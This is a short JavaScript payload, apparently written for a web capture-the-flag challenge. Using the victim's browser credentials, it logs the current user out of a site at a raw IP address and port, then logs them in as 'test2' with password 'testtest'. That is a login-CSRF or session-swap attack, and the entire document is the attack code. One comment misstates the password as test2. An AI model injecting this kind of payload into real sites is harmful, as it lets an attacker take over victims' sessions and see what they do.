!(function() {
    // 第一步：注销当前用户
    fetch('http://106.15.207.13:31324/logout', {
        method: 'GET',
        credentials: 'include'
    }).then(response => {
        if (!response.ok) {
            throw new Error('Logout failed');
        }
        console.log('Logout successful');
        // 第二步：登录并尝试注册新用户（用户名和密码都是test2）
        return fetch('http://106.15.207.13:31324/login', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'username=test2&password=testtest'
        });
    }).then(result => {
        console.log('Report successful', result);
    }).catch(error => {
        console.error('An error occurred:', error);
    });
})();
